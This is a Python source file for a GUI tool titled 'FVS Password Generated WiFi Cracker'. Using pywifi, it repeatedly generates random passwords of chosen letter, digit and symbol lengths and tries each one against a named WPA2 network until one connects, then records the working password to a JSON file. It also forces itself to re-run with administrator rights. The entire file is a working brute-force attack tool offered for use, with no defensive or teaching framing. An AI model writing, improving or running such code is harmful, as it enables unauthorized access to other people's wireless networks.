import time
import random
import json
import tkinter as tk
import ctypes
import sys
import os
import string
from pywifi import const, PyWiFi, Profile

# Initialize as a list
tried_passwords = []
previous_attempts_cache = set()
previous_ssid = ''
should_continue = True

# Load previously tried passwords if the file exists
try:
    with open('tried_passwords.json', 'r') as file:
        tried_passwords = json.load(file)
except FileNotFoundError:
    # Write an empty list to the JSON file if it doesn't exist
    with open('tried_passwords.json', 'w') as file:
        json.dump(tried_passwords, file, indent=4)




def load_settings():
    try:
        with open('settings.json', 'r') as file:
            settings = json.load(file)
            return settings
    except FileNotFoundError:
        return {}


loaded_settings = load_settings()
specific_password = loaded_settings.get('specific_password', '')
restart_count = loaded_settings.get('restart_count', 0)

root = tk.Tk()
root.title("FVS Password Generated WiFi Cracker")
root.configure(bg="black")


def save_settings():
    settings = {
        'ssid': ssid_entry.get(),
        'all_length': all_length_entry.get(),
        'letters_length': letters_length_entry.get(),
        'numbers_length': numbers_length_entry.get(),
        'special_characters_length': special_characters_entry.get(),
        'specific_password': specific_password_entry.get()  # Save the specific password
    }
    with open('settings.json', 'w') as file:
        json.dump(settings, file)


def auto_click_connect():
    start_button.invoke()


if "--auto-connect" in sys.argv:
    root.after(1000, auto_click_connect)

settings = load_settings()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)


def test_specific_password():
    ssid_input = ssid_entry.get()
    specific_password = specific_password_entry.get()
    if connect_to_wifi(ssid_input, specific_password, output_text):
        output_text.insert(tk.END, f"Successfully connected using specific password: {specific_password}\n")
        output_text.see(tk.END)

    else:
        output_text.insert(tk.END, f"Failed to connect using specific password: {specific_password}\n")
        output_text.see(tk.END)


def stop_connection():
    global should_continue
    should_continue = False
    save_settings()
    output_text.insert(tk.END, "Stopped connection attempts!\n")
    output_text.see(tk.END)


def generate_random_string(all_length, letters_length, numbers_length, special_characters_length):
    print(
        f"all_length: {all_length}, letters_length: {letters_length}, numbers_length: {numbers_length}, special_characters_length: {special_characters_length}")

    letters = string.ascii_letters
    numbers = string.digits
    special_characters = "!@#$%^&*()_-+=<>?"
    generated_letters = ''.join([random.choice(letters) for _ in range(letters_length)])
    generated_numbers = ''.join([random.choice(numbers) for _ in range(numbers_length)])
    generated_special_characters = ''.join(
        [random.choice(special_characters) for _ in range(special_characters_length)])
    random_string = generated_letters + generated_numbers + generated_special_characters
    remaining_length = all_length - len(random_string)
    all_characters = letters + numbers + special_characters
    random_string += ''.join([random.choice(all_characters) for _ in range(remaining_length)])
    random_string = ''.join(random.sample(random_string, len(random_string)))

    return random_string


def connect_to_wifi(ssid, password, output_text):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    profile = iface.add_network_profile(profile)
    iface.connect(profile)

    for _ in range(1):
        time.sleep(0.8)
        if iface.status() == const.IFACE_CONNECTED:
            output_text.insert(tk.END, f"Connected to {ssid} successfully!\nSSID: {ssid}\nPassword: {password}\n")
            output_text.see(tk.END)

            # Append the dictionary containing the password
            tried_passwords.append({"password": password})
            with open('tried_passwords.json', 'w') as file:
                json.dump(tried_passwords, file, indent=4)

            return True

    return False



def try_to_connect():
    global should_continue, previous_attempts_cache, previous_ssid, tried_passwords
    should_continue = True
    ssid_input = ssid_entry.get()

    # Check if the SSID has changed, and if so, reset the previous_attempts_cache
    if ssid_input != previous_ssid:
        previous_attempts_cache = set()
        tried_passwords = []  # Reset the tried_passwords list

    input_all_length = int(all_length_entry.get()) if all_length_entry.get() else 0
    input_letters_length = int(letters_length_entry.get()) if letters_length_entry.get() else 0
    input_numbers_length = int(numbers_length_entry.get()) if numbers_length_entry.get() else 0
    input_special_characters_length = int(special_characters_entry.get()) if special_characters_entry.get() else 0

    print("Starting connection attempts...")  # Debug print

    while should_continue:
        gen_password = generate_random_string(input_all_length, input_letters_length, input_numbers_length,
                                              input_special_characters_length)
        if gen_password in previous_attempts_cache:
            continue
        previous_attempts_cache.add(gen_password)

        print(f"Trying password: {gen_password}")  # Debug print

        if connect_to_wifi(ssid_input, gen_password, output_text):
            break
        else:
            output_text.insert(tk.END, f"{gen_password} ")  # Display the tried password
            output_text.see(tk.END)

            # Save tried password to JSON
            tried_passwords.append({"password": gen_password})

            # Check if the 'lists' folder exists, and if not, create it
            if not os.path.exists('lists'):
                os.makedirs('lists')

            with open('lists/tried_passwords.json', 'w') as file:
                json.dump(tried_passwords, file, indent=4)

            root.update()

    print("Finished connection attempts.")  # Debug print

    # Update the previous SSID
    previous_ssid = ssid_input


def create_label(text):
    return tk.Label(root, text=text, fg="green", bg="black")


def create_entry():
    return tk.Entry(root, fg="green", bg="black")


output_text = tk.Text(root, height=10, width=50, wrap=tk.WORD, fg="green", bg="black")
output_text.pack()

ssid_label = create_label("SSID:")
ssid_label.pack()
ssid_entry = create_entry()
ssid_entry.insert(0, settings.get('ssid', ''))
ssid_entry.pack()

all_length_label = create_label("Total Length")
all_length_label.pack()
all_length_entry = create_entry()
all_length_entry.insert(0, settings.get('all_length', ''))
all_length_entry.pack()

letters_length_label = create_label("Letters Length:")
letters_length_label.pack()
letters_length_entry = create_entry()
letters_length_entry.insert(0, settings.get('letters_length', ''))
letters_length_entry.pack()

numbers_length_label = create_label("Numbers Length:")
numbers_length_label.pack()
numbers_length_entry = create_entry()
numbers_length_entry.insert(0, settings.get('numbers_length', ''))
numbers_length_entry.pack()

special_characters_label = create_label("Special Characters Length:")
special_characters_label.pack()
special_characters_entry = create_entry()
special_characters_entry.insert(0, settings.get('special_characters_length', ''))
special_characters_entry.pack()

input_all_length = int(all_length_entry.get()) if all_length_entry.get() else 0
input_letters_length = int(letters_length_entry.get()) if letters_length_entry.get() else 0
input_numbers_length = int(numbers_length_entry.get()) if numbers_length_entry.get() else 0
input_special_characters_length = int(special_characters_entry.get()) if special_characters_entry.get() else 0

specific_password_label = create_label("Specific Password:")
specific_password_label.pack()
specific_password_entry = create_entry()
specific_password_entry.insert(0, specific_password)  # Set the specific password
specific_password_entry.pack()

start_button = tk.Button(root, text="Start Connection", fg="green", bg="black", command=try_to_connect)
start_button.pack()

stop_button = tk.Button(root, text="Stop Connection", fg="green", bg="black", command=stop_connection)
stop_button.pack()

test_specific_password_button = tk.Button(root, text="Test Specific Password", fg="green", bg="black",
                                          command=test_specific_password)
test_specific_password_button.pack()


def exit_app():
    save_settings()
    root.quit()


exit_button = tk.Button(root, text="Exit", fg="red", bg="black", command=exit_app)
exit_button.pack()

root.mainloop()
